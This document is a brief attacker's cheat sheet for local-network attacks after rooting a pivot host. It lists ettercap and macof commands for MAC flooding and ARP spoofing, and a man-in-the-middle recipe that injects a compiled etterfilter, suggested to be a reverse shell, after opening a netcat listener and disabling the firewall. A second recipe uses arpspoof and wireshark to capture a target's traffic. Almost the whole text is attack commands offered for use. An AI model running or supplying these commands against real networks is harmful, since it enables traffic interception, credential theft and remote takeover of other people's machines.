### Tools: Ettercap, macof, ip, nmap, ping

## Requirements: Root the machine that has access to more machines on its network, then scan with a port scanner (nmap)

# MAC FLODDING

#### ettercap -T -i INTERFACE -P rand_flood -q -w /tmp/tcpdump3.pcap

#### macof -i INTERFACE

# ARP SPOOFING

#### ettercap -T -i INTERFACE_2 -M arp

# MAN IN THE MIDDLE MANIPULATION

#### 1) Create a filter (preferably a reverse shell)

#### 2) Compile it with etterfilter

#### etterfilter example.ecf -o example.ef

#### 3) nc -lvnp PORT &

#### 4) ufw disable

#### 5) ettercap -T -i INTERFACE_2 -M arp -F example.ef

# MITM EXAMPLE 2
 
#### 1) sudo arpspoof -i INTERFACE -t TARGET_MACHINE DEFAULT_GATEWAY

#### 2) sudo wireshark (Capture live packets)

#### 3) Filter on wireshark on what traffic you want to capture

## TIP: Attacker and target should be connected in the same network for this to work
